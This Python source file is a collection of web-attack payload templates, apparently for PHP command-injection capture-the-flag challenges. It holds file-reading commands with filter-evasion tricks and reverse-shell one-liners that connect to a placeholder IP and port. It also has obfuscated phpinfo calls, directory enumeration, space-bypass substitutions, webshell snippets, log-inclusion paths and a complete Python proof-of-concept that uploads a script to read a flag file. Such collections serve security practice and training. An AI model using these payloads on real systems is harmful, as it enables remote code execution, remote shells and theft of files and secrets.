READFILE_TEMPLATES = [
    "cat {path}",
    "tac {path}",
    "nl {path}",
    "more {path}",
    "less {path}",
    "head {path}",
    "tail {path}",
    "sort {path}",
    "od -An -c {path}",
    "strings {path}",
    "paste {path}",
    "grep '.*' {path}",
    "sed -n '1,200p' {path}",
    "rev {path}",
    "uniq {path}",
    "base64 {path}",
    "mv {path} {path}.txt",
    "cp {path} /tmp/flag.txt",
    "awk '1' {path}",
    "diff / {path}",
    "dd if={path}",
    "ls {path}",
    "ca\\t {path}",
    "ca''t {path}",
    "a=ca;b=t;$a$b {path}",
    "b=l;c=s;d={path};$b$c $d",
    "echo `tac {path}`",
    "print(`cat {path}`)",
    "show_source('{path}')",
    "highlight_file('{path}')",
    "readgzfile('{path}')",
    "vi {path}",
    "grep '{keyword}' {path}",
]

READ_ENV_TEMPLATES = [
    "env",
    "printenv",
    "set",
]

REFLECT_SHELL_TEMPLATES = [
    "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    "sh -i >& /dev/tcp/{ip}/{port} 0>&1",
    "nc {ip} {port} -e /bin/sh",
    "busybox nc {ip} {port} -e /bin/sh",
    "python -c 'import os,pty,socket; s=socket.socket(); s.connect((\"{ip}\",{port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn(\"/bin/sh\")'",
]

PHPINFO_TEMPLATES = [
    "php -r 'phpinfo();'",
    "phpinfo();",
    "(~%8F%97%8F%96%91%99%90)();",
    "$_=(%ff%ff%ff%ff^%a0%b8%ba%ab);$_();",
    "eval(pos(get_defined_vars()));",
    "print_r(getallheaders());",
    "show_source(scandir(getcwd())[2]);",
    "show_source(current(array_reverse(scandir(getcwd()))));",
]

# Directory enumeration payloads extracted from eg.md.
# These focus on nested function composition for path traversal-like listing.
DIRECTORY_ENUM_TEMPLATES = [
    "print_r(scandir('/'));",
    "var_dump(scandir('/'));",
    "var_export(scandir('/'));",
    "echo(implode('--',scandir('/')));",
    "echo json_encode(scandir('/'));",
    "print_r(scandir(dirname(__FILE__)));",
    "print_r(scandir(dirname(__DIR__)));",
    "print_r(scandir(dirname(dirname(__FILE__))));",
    "print_r(scandir(dirname(dirname(__DIR__))));",
    "print_r(scandir(dirname(dirname(dirname(dirname(__DIR__))))));",
    "var_dump(scandir(dirname(dirname(dirname(dirname(__DIR__))))));",
    "var_export(scandir(dirname(dirname(dirname(dirname(__DIR__))))));",
    "echo(implode('--',scandir(dirname(dirname(dirname(dirname(__DIR__)))))));",
    "echo json_encode(scandir(dirname(dirname(dirname(dirname(__DIR__))))));",
    "var_export(glob('*'));",
    "var_export(glob('../*'));",
    "var_export(glob('../../*'));",
    "var_export(glob('../../../*'));",
]

# File selection payloads for scenarios where [] indexing is filtered.
FILE_ENUM_TEMPLATES = [
    "show_source(next(array_reverse(scandir(getcwd()))));",
    "echo highlight_file(current(array_reverse(scandir(pos(localeconv())))));",
    "echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));",
]

# Variable scope hijacking payload:
# attacker places executable code into POST values, then eval fetches and executes it.
VARIABLE_HIJACK_TEMPLATES = [
    "eval(array_pop(next(get_defined_vars())));",
]

# Space Bypass Templates
SPACE_BYPASS_TEMPLATES = [
    "{payload}".replace(" ", "${IFS}"),
    "{payload}".replace(" ", "$IFS$9"),
    "{payload}".replace(" ", "/**/"),
    "{payload}".replace(" ", "<>"),
    "{payload}".replace(" ", "<"),
    "{payload}".replace(" ", "%20"),
    "{payload}".replace(" ", "%09"),
    "{payload}".replace(" ", "%a0"),
]

# Upload File
UPLOAD_EXEC_TEMPLATES = [
    ". /???/????????[@-[]",
    ". /tmp/php??????",
    ". /var/tmp/php??????",
]

# Article final POC wrapper integration
# Wrapper only, no behavior change to existing templates.
UPLOAD_EXEC_WRAPPER_TEMPLATES = [
    "?><?=`{cmd}`;?>",
]

# Special output trigger payloads:
# show Egs hint when final payload matches bare or wrapped upload POC.
SPECIAL_UPLOAD_POC_TRIGGER_PAYLOADS = [
    ". /???/????????[@-[]",
    "?><?=`. /???/????????[@-[]`;?>",
]

SPECIAL_UPLOAD_POC_EGS = """
import requests

url = ""

params = {
    "shell":"?><?=`. /???/????????[@-[]`;?>"
}

file = {
    'file':("1.txt","#!/bin/sh\\n cat /flag","text/plain")
}

for i in range(1,20):
    res = requests.post(url=url, params=params, files=file)
    if "flag" in res.text:
        print(res.text)
        break"""

# PHP Command Execution Functions
PHP_EXEC_WRAPPERS = [
    "system",
    "passthru",
    "shell_exec",
    "exec",
]

# Short Tag Templates
SHORT_TAG_TEMPLATES = [
    "<?={payload}?>",
    "<?= {payload} ?>",
]

# Backtick Templates
BACKTICK_TEMPLATES = [
    "`{path}`",
    "`cat {path}`",
]

# Include Templates
INCLUDE_TEMPLATES = [
    "include $_GET[x];&x=php://filter/read=convert.base64-encode/resource={path}",
    "include('{path}');",
    "require('{path}');",
    "include_once('{path}');",
    "require_once('{path}');",
]

# Webshell Templates (Param Exec)
WEBSHELL_TEMPLATES = [
    "eval($_GET[x]);&x=system('{cmd}');",
    "assert($_POST[x]);",
    "call_user_func($_GET[x], $_GET[y]);",
]

# Log Inclusion Templates
LOG_INCLUSION_TEMPLATES = [
    "/var/log/nginx/access.log",
    "/var/log/apache2/access.log",
    "/var/log/httpd/access_log",
    "/proc/self/environ",
    "/proc/self/fd/0",
    "/proc/self/fd/1",
    "/proc/self/fd/2",
]
